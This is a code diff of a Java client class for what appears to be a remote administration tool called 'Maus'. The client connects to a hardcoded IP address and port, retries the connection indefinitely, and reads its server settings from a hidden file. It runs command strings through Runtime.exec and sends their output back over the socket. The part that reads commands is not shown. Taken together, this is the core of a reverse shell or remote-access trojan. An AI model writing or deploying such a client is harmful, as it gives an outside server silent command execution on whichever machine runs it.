@@ -4,28 +4,32 @@ import java.io.*;
 import java.net.Socket;
 
 public class Client {
-    private static String HOST = "141.219.247.168";
+    private static String HOST = "141.219.244.180";
     private static int PORT = 22122;
     private PrintWriter out;
 
-    public static String getHOST() {
+
+    private static String getHOST() {
         return HOST;
     }
 
-    public static void setHOST(String HOST) {
+    private static void setHOST(String HOST) {
         Client.HOST = HOST;
     }
 
-    public static int getPORT() {
+    private static int getPORT() {
         return PORT;
     }
 
-    public static void setPORT(int PORT) {
+    private static void setPORT(int PORT) {
         Client.PORT = PORT;
     }
 
     public static void main(String[] args) throws InterruptedException {
-        new Client().connect();
+        /* Load server settings and then attempt to connect to Maus. */
+        Client client = new Client();
+        client.loadServerSettings();
+        client.connect();
     }
 
     private void connect() throws InterruptedException {
@@ -46,51 +50,54 @@ public class Client {
                 }
             }
         } catch (IOException e) {
+            /* Continually retry connection until established. */
             System.out.println("Disconnected... retrying.");
-            Thread.sleep(200);
+            Thread.sleep(1200);
             connect();
         }
     }
 
+
+    /* Sends a message to the Server. */
     private void communicate(String msg) {
         out.println(msg);
     }
 
-    private void exec(String command) throws IOException {
+    /* Execute a command using Java's Runtime. */
+    private void exec(String command) throws IOException, InterruptedException {
         if (!command.equals("")) {
-            System.out.println(command);
-            ProcessBuilder pb = new ProcessBuilder(command);
-            Process p = pb.start();
-            BufferedReader stdInput = new BufferedReader(new
-                    InputStreamReader(p.getInputStream()));
-            BufferedReader stdError = new BufferedReader(new
-                    InputStreamReader(p.getErrorStream()));
-            String s;
-            while ((s = stdInput.readLine()) != null) {
-                System.out.println(s);
-            }
 
-            while ((s = stdError.readLine()) != null) {
-                System.out.println(s);
+            Process proc = Runtime.getRuntime().exec(command);
+
+            BufferedReader reader =
+                    new BufferedReader(new InputStreamReader(proc.getInputStream()));
+
+            String line = "";
+            while((line = reader.readLine()) != null) {
+                System.out.print(line + "\n");
+                communicate(line);
             }
             communicate("end");
         }
     }
 
     private void loadServerSettings() {
-        try (BufferedReader reader = new BufferedReader(new FileReader(".mauscs"))
+        try (BufferedReader reader = new BufferedReader(new FileReader(new File(Client.class.getProtectionDomain().getCodeSource().getLocation() + "Client/.mauscs")))
         ) {
+            System.out.println("Run");
             String line;
             StringBuilder stringBuilder = new StringBuilder();
             while ((line = reader.readLine()) != null) {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
+            System.out.println(settings[0]);
             if (settings.length == 2) {
                 setHOST(settings[0]);
                 setPORT(Integer.parseInt(settings[1]));
             }
-        } catch (IOException ignored) {
+        } catch (IOException e) {
+            e.printStackTrace();
         }
     }
 }
